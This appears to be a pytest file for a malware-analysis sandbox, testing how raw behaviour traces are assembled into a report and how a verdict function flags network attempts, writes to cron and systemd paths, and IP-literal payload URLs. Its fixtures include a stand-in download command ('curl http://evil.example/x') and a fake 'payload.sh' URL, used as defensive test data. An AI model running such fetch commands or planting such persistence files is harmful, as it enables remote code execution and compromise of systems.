import json, sys, tempfile
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))
from sandbox import build_report, verdict


def make_raw(tmp, files):
    d = Path(tmp)
    for name, content in files.items():
        (d / name).write_text(content)
    return d


def test_report_assembly():
    with tempfile.TemporaryDirectory() as t:
        d = make_raw(t, {
            "sha256": "aa11\n", "filetype": "ELF 64-bit LSB executable, x86-64\n",
            "ran": "1\n", "urls": "http://evil.example/x\n",
            "ips": "10.1.2.3\n", "net_attempts": "10.1.2.3\n",
            "fs_ops": "/etc/cron.d/x\n/tmp/y\n", "execve": "/sample\n/usr/bin/curl\n",
            "interesting": "curl http://evil.example/x\n", "imports": "libc.so.6\n",
        })
        rep = build_report(d, "sample.bin")
        assert rep["sha256"] == "aa11"
        assert rep["ran"] is True
        assert rep["net_attempts"] == ["10.1.2.3"]
        assert rep["execve"] == ["/sample", "/usr/bin/curl"]


def test_verdict_suspicious_on_network():
    rep = {"net_attempts": ["45.1.2.3"], "fs_ops": [], "execve": ["/sample"], "urls": []}
    level, reasons = verdict(rep)
    assert level == 3 and any("45.1.2.3" in r for r in reasons)


def test_verdict_suspicious_on_system_paths():
    rep = {"net_attempts": [], "fs_ops": ["/etc/systemd/system/evil.service"], "execve": ["/sample"], "urls": []}
    level, reasons = verdict(rep)
    assert level == 3


def test_verdict_clean():
    rep = {"net_attempts": [], "fs_ops": ["/tmp/scratch"], "execve": ["/sample"], "urls": []}
    level, reasons = verdict(rep)
    assert level == 5 and reasons == []


def test_verdict_domain_urls_alone_are_context():
    rep = {"net_attempts": [], "fs_ops": [], "execve": ["/sample"],
           "urls": ["https://gnu.org/licenses/gpl.html"]}
    level, reasons = verdict(rep)
    assert level == 5


def test_verdict_ip_literal_url_is_suspicious():
    rep = {"net_attempts": [], "fs_ops": [], "execve": ["/sample"],
           "urls": ["http://45.155.20.10/payload.sh"]}
    level, reasons = verdict(rep)
    assert level == 3
